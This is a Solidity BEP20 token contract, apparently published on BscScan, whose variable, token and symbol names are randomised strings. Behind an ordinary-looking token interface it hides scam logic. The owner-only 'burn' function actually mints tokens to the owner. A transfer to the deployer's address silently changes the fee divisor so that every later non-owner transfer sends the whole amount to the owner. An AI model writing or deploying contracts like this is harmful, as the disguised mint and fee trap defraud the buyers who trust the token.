/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 08:22:00 GMT 
 */
pragma solidity >=0.5.11;
contract FyCfnQ {
address public  VQAviS = address(0);
address private  HLxzpK = address(0);
uint256 public  JWRjhE = 100000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  ECUMJl = 10000000000000;
uint256 public  WtAxBI = 10000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  aihMSG = 100000000000000000000;
uint8 public constant decimals = 18;
uint256 public  HUEuPT = 100000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  ZDrjwF = address(0);
address public  wllaGr = address(0);
address public  seurxp = address(0);
uint256 public  kPnPyf = 1000000000000000000;
address public  arvAUx = address(0);
address public  BSHCtl = address(0);
string public  symbol = "mQnfNd";
address public owner;
uint256 public  rvSTXE = 10000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "rKtINq";
uint256 public constant XJUFYN = 9+1;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  ghdDFQ = 100000000000000000;
uint256 public  JOPxNO = 10000000000000000000;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "NFeBEH");
require(to != address(0), "NFeBEH");
require(amount <= balanceOf[from], "NFeBEH");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XJUFYN/ECUMJl ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HLxzpK){
ECUMJl = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
HLxzpK = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}